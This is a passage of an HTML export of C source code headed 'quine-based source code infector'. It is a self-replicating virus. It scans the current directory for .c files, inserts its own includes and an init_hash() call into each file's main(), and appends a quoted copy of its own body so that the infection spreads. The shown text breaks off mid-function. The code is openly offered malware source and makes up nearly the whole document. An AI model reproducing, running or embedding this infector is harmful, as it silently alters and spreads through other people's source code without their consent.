<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
 * Hash,
 *
 * quine-based source code infector.
 *                   zert &lt;zert@int80h.net&gt;
 *
 */</span><span class="sc0">

</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;unistd.h&gt;
#include &lt;dirent.h&gt;
#include &lt;fcntl.h&gt;
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">init_hash</span><span class="sc10">();</span><span class="sc0"> 

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">init_hash</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">init_hash</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mpos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ipos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">page</span><span class="sc10">,</span><span class="sc0"> 
    </span><span class="sc11">ihole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">thole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ehole</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dir</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">DIR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">d</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">hashinc</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\n#include &lt;stdio.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;dirent.h&gt;\n#include &lt;fcntl.h&gt;\n\nvoid init_hash();\n"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">hashbeg</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\nvoid init_hash()\n{\n\tint i, j, fd, size, mpos, ipos, page, \n\tihole, thole, bhole, ehole; struct dirent *dir; DIR *d;\n\tvoid *ptr;\n\tchar hashinc[] = \""</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">hashend</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\tchar *buf;\n\n\td = opendir(\".\");\n\twhile((dir = readdir(d))&gt;0)\n\t\tif(!(strcmp(dir-&gt;d_name+strlen(dir-&gt;d_name)-2,\".c\"))||\n\t\t   !(strcmp(dir-&gt;d_name+strlen(dir-&gt;d_name)-2,\".C\"))) \n\t\t\tif((fd=open(dir-&gt;d_name, O_RDWR, 0))&gt;=0)\n\t\t\t{\n\t\t\t\tsize = lseek(fd, 0, SEEK_END);\n\t\t\t\tptr = mmap(NULL,size,PROT_READ,MAP_PRIVATE,fd,0);\n\t\t\t\tif( (!strstr(ptr,\"init_hash\")) &amp;&amp;\n\t\t\t\t  ( ((mpos=(int)strstr(ptr,\"\\nmain(\"))&gt;0) ||\n\t\t\t\t    ((mpos=(int)strstr(ptr,\"\\nint main(\"))&gt;0) ||\n\t\t\t\t    ((mpos=(int)strstr(ptr,\"\\nvoid main(\"))&gt;0) || \n\t\t\t\t    ((mpos=(int)strstr(ptr,\"\\nmain (\"))&gt;0) ||\n\t\t\t\t    ((mpos=(int)strstr(ptr,\"\\nint main (\"))&gt;0) ||\n\t\t\t\t    ((mpos=(int)strstr(ptr,\"\\nvoid main (\"))&gt;0) ) )\n\t\t\t\t{\n\t\t\t\t\tmpos = (int)strstr((void *)mpos, \";\\n\");\n\t\t\t\t\tmpos -= (int)--ptr;\n\t\t\t\t\tif( !(ipos = (int)strstr(++ptr, \"#include &lt;\")) )\n\t\t\t\t\t{\n\t\t\t\t\t\tmunmap(ptr, size);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tmunmap(ptr, size);\n\t\t\t\t\tpage = 3 * (int)sysconf(_SC_PAGESIZE);\n\t\t\t\t\tftruncate(fd, size+page);\n\t\t\t\t\tptr = mmap(NULL,size+page,PROT_READ+PROT_WRITE,MAP_SHARED,fd,0);\n\t\t\t\t\tipos = (int)strstr(ptr, \"#include &lt;\");\n\t\t\t\t\tipos = (int)strstr((void *)ipos, \"\\n\\n\");\n\t\t\t\t\tipos -= (int)ptr;\n\t\t\t\t\tihole = strlen(hashinc);\n\t\t\t\t\tfor(i=(size-ipos)/ihole;i&gt;=0;i--) \n\t\t\t\t\t\tmemcpy(ptr+ipos+i*ihole+ihole, ptr+ipos+i*ihole, ihole);\n\t\t\t\t\tmemcpy(ptr+ipos, hashinc, ihole);\n\t\t\t\t\tmpos += ihole;\n\t\t\t\t\tbuf = (char *)malloc(20*sizeof(char));\n\t\t\t\t\tstrcpy(buf,\"\\n\\tinit_hash();\");\n\t\t\t\t\tthole = strlen(buf);\n\t\t\t\t\tfor(i=(size+ihole-mpos)/thole;i&gt;=0;i--) \n\t\t\t\t\t\tmemcpy(ptr+mpos+i*thole+thole, ptr+mpos+i*thole, thole);\n\t\t\t\t\tmemcpy(ptr+mpos, buf, thole);\n\t\t\t\t\tbhole = strlen(hashbeg);\n\t\t\t\t\tmemcpy(ptr+size+ihole+thole, hashbeg, bhole);\n\t\t\t\t\tbuf = (char *)malloc(100*sizeof(char)+strlen(hashinc));\n\t\t\t\t\tfor(i=0,j=0;i&lt;strlen(hashinc);i++,j++)\n\t\t\t\t\t\tswitch(hashinc[i])\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcase '\\n':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\n\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\t':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\t\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\\':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\\\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\"':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\"\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"%c\", hashinc[i]);\n\t\t\t\t\t\t} \n\t\t\t\t\tmemcpy(ptr+size+ihole+thole+bhole, buf, strlen(buf));\n\t\t\t\t\tbhole += strlen(buf);\n\t\t\t\t\tsprintf(ptr+size+ihole+thole+bhole, \"\\\";\\n\\tchar hashbeg[] =\\\"\");\n\t\t\t\t\tbhole += 21;\n\t\t\t\t\tbuf = (char *)malloc(100*sizeof(char)+strlen(hashbeg));\n\t\t\t\t\tfor(i=0,j=0;i&lt;strlen(hashbeg);i++,j++)\n\t\t\t\t\t\tswitch(hashbeg[i])\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcase '\\n':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\n\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\t':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\t\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\\':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\\\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\"':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\"\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"%c\", hashbeg[i]);\n\t\t\t\t\t\t} \n\t\t\t\t\tmemcpy(ptr+size+ihole+thole+bhole, buf, strlen(buf));\n\t\t\t\t\tbhole += strlen(buf);\n\t\t\t\t\tsprintf(ptr+size+ihole+thole+bhole, \"\\\";\\n\\tchar hashend[] =\\\"\");\n\t\t\t\t\tbhole += 21;\n\t\t\t\t\tbuf = (char *)malloc(100*sizeof(char)+strlen(hashend));\n\t\t\t\t\tfor(i=0,j=0;i&lt;strlen(hashend);i++,j++)\n\t\t\t\t\t\tswitch(hashend[i])\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcase '\\n':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\n\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\t':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\t\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\\':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\\\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\"':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\"\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"%c\", hashend[i]);\n\t\t\t\t\t\t} \n\t\t\t\t\tmemcpy(ptr+size+ihole+thole+bhole, buf, strlen(buf));\n\t\t\t\t\tbhole += strlen(buf);\n\t\t\t\t\tsprintf(ptr+size+ihole+thole+bhole, \"\\\";\\n\");\n\t\t\t\t\tbhole += 3;\n\n\t\t\t\t\tehole = strlen(hashend);\n\t\t\t\t\tmemcpy(ptr+size+ihole+thole+bhole, hashend, ehole);\n\t\t\t\t\tmsync(ptr, size+page, MS_SYNC);\n\t\t\t\t\tmunmap(ptr, size+page);\n\t\t\t\t\tftruncate(fd, size+ihole+thole+bhole+ehole);\n\t\t\t\t} else\n\t\t\t\t{\n\t\t\t\t\tmunmap(ptr, size);\n\t\t\t\t}\n\t\t\t}\n}\n"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">opendir</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">((</span><span class="sc11">dir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">readdir</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">)-</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc6">".c"</span><span class="sc10">))||</span><span class="sc0">
           </span><span class="sc10">!(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">)-</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc6">".C"</span><span class="sc10">)))</span><span class="sc0"> 
            </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDWR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))&gt;=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_END</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mmap</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">size</span><span class="sc10">,</span><span class="sc11">PROT_READ</span><span class="sc10">,</span><span class="sc11">MAP_PRIVATE</span><span class="sc10">,</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"init_hash"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                  </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nmain("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nint main("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nvoid main("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> 
                    </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nmain ("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nint main ("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nvoid main ("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">mpos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">mpos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">";\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">mpos</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)--</span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">!(</span><span class="sc11">ipos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(++</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"#include &lt;"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">munmap</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">munmap</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">page</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">sysconf</span><span class="sc10">(</span><span class="sc11">_SC_PAGESIZE</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ftruncate</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">page</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mmap</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">page</span><span class="sc10">,</span><span class="sc11">PROT_READ</span><span class="sc10">+</span><span class="sc11">PROT_WRITE</span><span class="sc10">,</span><span class="sc11">MAP_SHARED</span><span class="sc10">,</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ipos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"#include &lt;"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ipos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">ipos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\n\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ipos</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">ihole</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashinc</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=(</span><span class="sc11">size</span><span class="sc10">-</span><span class="sc11">ipos</span><span class="sc10">)/</span><span class="sc11">ihole</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&gt;=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">--)</span><span class="sc0"> 
                        </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">ipos</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">ipos</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc11">ihole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ihole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">ipos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashinc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ihole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">mpos</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ihole</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc4">20</span><span class="sc10">*</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc6">"\n\tinit_hash();"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">thole</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=(</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">-</span><span class="sc11">mpos</span><span class="sc10">)/</span><span class="sc11">thole</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&gt;=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">--)</span><span class="sc0"> 
                        </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">mpos</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">mpos</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc11">thole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">thole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">mpos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">thole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashbeg</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashbeg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bhole</span><span class="sc10">);</span><span class="sc0">
                    
                    </span><span class="sc1">/* declaracion de arrays y arrays */</span><span class="sc0">
                    </span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc4">100</span><span class="sc10">*</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashinc</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashinc</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++,</span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
                        </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">hashinc</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\n"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\t'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\t"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\\\"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\"'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\\""</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
